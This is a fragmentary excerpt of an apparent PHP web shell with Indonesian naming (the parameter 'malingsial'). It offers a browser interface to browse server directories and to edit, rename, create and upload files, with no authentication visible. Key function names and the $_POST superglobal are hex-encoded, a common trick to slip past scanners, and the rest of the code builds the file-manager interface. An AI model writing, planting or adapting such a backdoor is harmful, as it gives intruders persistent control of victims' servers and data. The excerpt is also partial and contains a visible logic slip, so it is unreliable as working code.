...
if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
  $getInfo['os'] = 'Windows';
  $paths = explode('\\', $getInfo['malingsial']);
  $paths = $paths[0] . '/';
...
if(isset($_GET['malingsial'])) {
	$replace = str_replace('\\', '/', $_GET['malingsial']);
	$replace = str_replace('//', '/', $_GET['malingsial']);
...
if(isset($_POST['pilihan'])) {
    switch ($_POST['pilihan']) {
        case 'edit':
            $edit = true;
            $dirFile = ${"\x5f\x50\x4f\x53\x54"}['dir'];
            $sourceFile = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['sourceFile']);
            if(!empty($sourceFile)){
                ...
                if($fileHandle !== false){
                    if(fwrite($fileHandle, $sourceFile) !== false) {
                        ...
                        fclose($fileHandle);
                        $successEdit = 'Failed edit';
                    }
                } else {
                    $successEdit = 'Failed open file';
                }
            }
            break;
		case $_POST['pilihan'] == 'rename':
			...
			if(!empty($namaBaru)){
				if(rename($dirFile, $_GET['malingsial'] . '/' . $namaBaru)) {
					$filename = $namaBaru;
					$dirFile = $_GET['malingsial'] . '/' . $namaBaru;
		...
		case $_POST['pilihan'] == 'upload':
			$path = $replace;
			if(isset($_GET['malingsial'])) {
				$path = $_GET['malingsial'];
			}

			if(isset($_FILES['uploadFile'])) {
				$namafile = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['uploadFile']['name']);
				$tempatfile = $_FILES['uploadFile']['tmp_name'];
				$error = $_FILES['uploadFile']['error'];
				$ukuranfile = $_FILES['uploadFile']['size'];

				if("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($tempatfile, $path.'/'.$namafile)) {
					echo "<script>
...
<div class="row">
	...
	<?php   
				echo '<a href="?malingsial=' . $paths . '">' . '-' . '</a>';
				for ($i = 1; $i < count($pecah); $i++) {
					$subpath = implode('/', array_slice($pecah, 1, $i));
					echo '/';
					echo '<a href="?malingsial=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
				}
				?>
	</div>
    <form class="col s12">
	...
	<?php }else if($edit){ ?>
		...
		<div class="row">
			<form class="col s12">
				<div class="input-field col s12">
				<textarea name="sourceFile" id="textarea" class="materialize-textarea" style="background-color: #424242; overflow-y: auto;" ><?= bungkus($dirFile); ?></textarea>
   ...
   <div class="container">	
   <b class="info">
	 <a href="?create&malingsial=<?= isset($_GET['malingsial']) ? $_GET['malingsial'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light red"><i class="material-icons">add</i></a> <b>Add File&nbsp;&nbsp;&nbsp;</b>
	 <a href="?createFolder&malingsial=<?= isset($_GET['malingsial']) ? $_GET['malingsial'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light blue""><i class="material-icons">add</i></a> <b>Add Folder</b>
	<br>
	<b class="info">
		 <form method="POST" enctype="multipart/form-data">
		    <div class="file-field input-field">
		      <div class="">
		        ...
		        <input type="hidden" name="dir" value="<?= $_GET['malingsial'] ?>">
		        <input type="file" name="uploadFile">
		      </div>
		      <div class="file-path-wrapper">
		        <input class="file-path validate" type="text" style="width: 300px; color: white;" value="Select File">
   ...
   <div class="container">	
	<table class="striped centered bordered">
		...
		<tr>
			<td><a style="color: white;" href="?malingsial=<?= str_replace([".", "//"], ["%2e", '/'], $get . '/' . $dir); ?>"><?= $dir; ?></a></td>
			...
			<td>
				...
				<form method="POST" action="?set&malingsial=<?= $get; ?>">
					<center>
